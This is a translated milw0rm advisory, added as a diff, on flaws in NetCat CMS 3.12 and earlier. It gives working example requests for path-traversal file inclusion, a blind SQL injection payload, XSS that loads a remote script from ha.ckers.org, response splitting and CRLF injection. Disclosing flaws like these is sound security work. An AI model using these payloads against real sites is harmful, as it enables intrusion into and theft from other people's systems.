@@ -1,0 +1,48 @@
+NetCat <= 3.12 Multiple Remote Vulnerabilities
+
+The description:
+The set vulnerability in CMS NetCat versions 3.12 and more low was revealed.
+
+1. Multiple File Including Vulnerabilities
+
+Vulnerability exists for the reason that direct access to some files, around logicians of work of the appendix is possible.
+It gives the chance to redefine internal variables which are transferred as arguments in function include ().
+Examples of vulnerable files:
+/netcat/modules/netshop/post.php?system=../../../../.htaccess%00
+/netcat/modules/auth.inc.php?INCLUDE_FOLDER=../../.htaccess%00
+/netcat/modules/banner.inc.php?INCLUDE_FOLDER=../../.htaccess%00
+/netcat/modules/blog.inc.php?INCLUDE_FOLDER=../../.htaccess%00
+/netcat/modules/forum.inc.php?INCLUDE_FOLDER=../../.htaccess%00
+
+The note:
+For vulnerability operation the following options PHP are required: register_globals=On and magic_quotes_gpc=Off
+
+2. Blind SQL Injection Vulnerabilities
+
+Examples of vulnerable files:
+/netcat/modules/auth/password_recovery.php?=1'SQL_code
+
+Example:
+/netcat/modules/auth/password_recovery.php?=1'/**/OR/**/VERSION()/**/LIKE/**/'4%'/*
+
+The note:
+For vulnerability operation the following options PHP are required:magic_quotes_gpc=Off
+
+3. Multiple Cross-site Scripting Vulnerabilities
+
+Examples of vulnerable files: 
+/netcat/admin/siteinfo/iframe.inc.php?path=http://ha.ckers.org/scriptlet.html" 
+/netcat/FCKeditor/neditor.php?form=<XSS>&control=<XSS> etc.
+
+4. HTTP Response Splitting
+
+Examples of vulnerable files: 
+/netcat/modules/auth/index.php?logoff=1&redirect=http://www.google.com 
+/netcat/modules/linkmanager/redirect.php?url=http://www.google.com
+
+5. CRLF injection 
+
+Vulnerability exists at the moment of value installation %0a in COOKIEvariables.
+Vulnerability has been found out at the reference to a file /netcat/add.php.
+
+# milw0rm.com [2008-12-23]
